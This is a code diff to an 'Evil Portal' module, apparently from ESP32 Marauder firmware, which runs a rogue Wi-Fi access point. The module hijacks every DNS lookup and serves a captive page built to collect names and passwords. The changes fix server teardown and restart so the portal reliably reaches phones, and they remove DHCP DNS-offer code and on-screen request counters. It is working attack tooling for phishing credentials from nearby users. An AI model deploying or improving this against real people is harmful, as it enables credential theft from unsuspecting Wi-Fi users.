@@ -1,6 +1,4 @@
 #include "EvilPortal.h"
-#include "esp_idf_version.h"
-#include "esp_netif.h"
 
 char apName[MAX_AP_NAME_SIZE] = "PORTAL";
 
@@ -48,15 +46,24 @@ void EvilPortal::setup() {
 }
 
 void EvilPortal::cleanup() {
+  // Only tear the web server / DNS down if THIS object actually started them.
+  // cleanup() is called from every StopScan, not just Evil Portal's, so an
+  // unconditional teardown ran on unrelated scans too. Crucially we call
+  // server.end() (not just softAPdisconnect): AsyncServer::begin() no-ops when
+  // it still thinks it is listening, so without end() the listener left dangling
+  // after the AP was torn down was never re-armed -> the next activation's
+  // server.begin() did nothing and every request was refused ("connected, no
+  // portal", zero portal requests). end() frees the listening PCB so the next
+  // begin() creates a fresh one. AP/radio teardown is left to
+  // WiFiScan::shutdownWiFi(), which runs right after this (see StopScan).
+  const bool portal_was_running = this->runServer;
+  this->runServer = false;
   this->ap_index = -1;
 
-  // Free the per-activation network resources so repeated Start/Stop cycles don't
-  // leak: stop the DNS server (frees its UDP pcb) and tear down the SoftAP netif +
-  // DHCP lease pool. Previously cleanup() freed only the PSRAM HTML buffer, so each
-  // cycle leaked the DNS socket + AP netif and the web handlers grew unbounded (see
-  // the register-once guard in startAP()).
-  this->dnsServer.stop();
-  WiFi.softAPdisconnect(true);
+  if (portal_was_running) {
+    this->dnsServer.stop();
+    server.end();
+  }
 
   free(index_html);
   index_html = nullptr;
@@ -343,62 +350,25 @@ void EvilPortal::startAP() {
   WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(apName);
 
-  // Make the captive portal actually reach the phone. On older ESP32 cores the
-  // softAP DHCP advertised itself as the client's DNS server by default, so the
-  // classic DNS-hijack portal (dnsServer below, same as upstream/Eternal) popped
-  // automatically. This ESP32-C5 / IDF 5.5 core does NOT set that by default, so
-  // the phone connects, never queries our wildcard DNS, and shows "connected, no
-  // portal" -- exactly the observed failure (HTML loads, zero portal requests).
-  //
-  // Fix, done safely this time: wait until the SoftAP is fully up (DHCP running)
-  // THEN do a single guarded DHCP stop -> set options -> start. The earlier
-  // attempt crashed because it reconfigured DHCP before the AP had started.
-  //   (1) OFFER_DNS + DNS=us  -> phone uses us as DNS -> hijack works everywhere
-  //   (2) RFC 8910 portal URL -> modern phones auto-open it, no DNS needed
-  for (int i = 0; i < 40 && static_cast<uint32_t>(WiFi.softAPIP()) == 0; i++)
-    delay(25);
-
-  esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-  if (ap_netif != nullptr && static_cast<uint32_t>(WiFi.softAPIP()) != 0) {
-    esp_err_t stop_err = esp_netif_dhcps_stop(ap_netif);
-    if (stop_err == ESP_OK || stop_err == ESP_ERR_ESP_NETIF_DHCP_ALREADY_STOPPED) {
-      esp_netif_dns_info_t dns_info = {};
-      dns_info.ip.type = ESP_IPADDR_TYPE_V4;
-      dns_info.ip.u_addr.ip4.addr = static_cast<uint32_t>(AP_IP);
-      esp_netif_set_dns_info(ap_netif, ESP_NETIF_DNS_MAIN, &dns_info);
-      uint8_t dns_offer = 2;  // OFFER_DNS: hand out a DNS server in DHCP leases
-      esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET,
-                             ESP_NETIF_DOMAIN_NAME_SERVER,
-                             &dns_offer, sizeof(dns_offer));
-      #if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
-        char cp_uri[40];
-        snprintf(cp_uri, sizeof(cp_uri), "http://%s",
-                 WiFi.softAPIP().toString().c_str());
-        esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET,
-                               ESP_NETIF_CAPTIVEPORTAL_URI, cp_uri, strlen(cp_uri));
-      #endif
-      esp_netif_dhcps_start(ap_netif);
-    }
-  }
-
   #ifndef MARAUDER_V8
     Serial.print(F("ap ip address: "));
     Serial.println(WiFi.softAPIP());
   #endif
 
-  // Register the web-server endpoints + captive handler ONCE for the app lifetime.
-  // setupServer() appends ~12 handlers and addHandler() allocates a
-  // CaptiveRequestHandler; re-running them on every Start leaked those per activation
-  // (server._handlers grew unbounded). They are owned by the global `server` and this
-  // is the singleton evil_portal_obj, so once is enough; server.begin() is idempotent.
-  // The AP + DNS themselves ARE rebuilt each Start (cleanup() tears them down).
+  // Register the web-server endpoints + captive handler ONCE (addHandler leaks a
+  // CaptiveRequestHandler per call and server.on() appends duplicate handlers),
+  // but call server.begin() on EVERY activation. This matches Marauder Eternal
+  // and fixes the core serving bug: our cleanup() tears the AP down between
+  // runs, which kills the listening socket, so a begin() that only ran once left
+  // the web server dead -> the phone connected but every request was refused
+  // (portal reqs stayed 0). Re-begin()'ing re-arms the listener each time.
   static bool s_server_registered = false;
   if (!s_server_registered) {
     this->setupServer();
     server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
-    server.begin();
     s_server_registered = true;
   }
+  server.begin();
 
   this->dnsServer.start(53, "*", WiFi.softAPIP());
   #ifndef MARAUDER_V8
@@ -406,13 +376,6 @@ void EvilPortal::startAP() {
   #endif
   #ifdef HAS_SCREEN
     this->sendToDisplay(F("Evil Portal READY"));
-    // Diagnostics (main-task context, display-safe): confirm the AP is up with
-    // an IP, and that the portal HTML actually loaded. If "HTML 0b" shows, the
-    // SD page wasn't read; if an IP shows but the phone never bumps the request
-    // counter (see main()), the captive DNS redirect isn't reaching us.
-    this->sendToDisplay("AP IP: " + WiFi.softAPIP().toString());
-    this->sendToDisplay("HTML " + (String)(index_html ? strlen(index_html) : 0) +
-                        "b  page: " + this->target_html_name);
   #endif
 }
 
@@ -447,17 +410,6 @@ void EvilPortal::main(uint8_t scan_mode) {
   }
 
   this->dnsServer.processNextRequest();
-
-  // Diagnostics: surface, from the main task, how many HTTP requests the portal
-  // has actually received. If this climbs when the phone connects, the captive
-  // redirect + server are reaching us and any "no page" is a content issue; if
-  // it stays at 0, the phone's request never arrives (DNS/redirect/ softAP).
-  #ifdef HAS_SCREEN
-    if (this->http_hits != this->http_hits_shown) {
-      this->http_hits_shown = this->http_hits;
-      this->sendToDisplay("portal reqs: " + (String)this->http_hits);
-    }
-  #endif
 
   if (this->name_received && this->password_received) {
     this->name_received = false;
